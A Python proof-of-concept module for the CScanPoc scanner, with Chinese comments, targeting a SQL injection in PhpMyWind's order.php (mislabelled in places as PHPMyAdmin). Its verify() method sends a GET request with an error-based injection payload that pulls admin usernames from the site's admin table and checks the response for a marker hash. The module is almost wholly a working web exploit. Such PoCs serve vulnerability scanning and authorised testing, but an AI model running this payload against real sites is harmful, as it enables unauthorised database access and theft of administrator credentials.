# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request, urllib.parse, urllib.error
import urllib.request, urllib.error, urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'PHPMyAdmin_0003_p'  # 平台漏洞编号，留空
    name = 'PhpMyWind SQL Injection'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-01-15'  # 漏洞公布时间
    desc = '''
        order.php第39行，
        $sql = “SELECT * FROM `#@__cascadedata` WHERE level=$level And “;$level没有过滤造成SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/1170/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPMyAdmin'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4d1a3fa6-0a80-4741-bd2b-633ce138c8e4'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # 根据实际环境payload
            payload = '/phpmywind/order.php'
            data = "?action=getarea&level=1%20%20or%20@`\’`=1%20and%20(SELECT%201%20FROM%20(select%20count(*),concat(floor(rand(0)*2),0x7e,(substring((Select%20concat(username,0x7e,md5(c))%20from%20`%23@__admin`),1,62)))a%20from%20information_schema.tables%20group%20by%20a)b)%20and%20@`\’`=0%23"
            url = self.target + payload + data
            r = requests.get(url)
            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
